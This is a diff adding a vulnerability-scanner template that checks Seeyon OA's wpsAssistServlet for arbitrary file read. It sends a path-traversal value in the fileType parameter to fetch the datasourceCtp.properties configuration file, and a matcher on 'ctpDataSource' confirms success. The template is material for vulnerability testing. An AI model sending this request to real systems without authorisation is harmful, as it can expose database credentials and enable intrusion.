@@ -1,0 +1,23 @@
+id: seeyon-wpsassistservlet-filetype-fileread
+
+info:
+  name: 致远OA wpsAssistServlet fileType 任意文件读取
+  author: HuanXiong
+  severity: medium
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip
+        Accept-Language: en
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains(body,'ctpDataSource')"
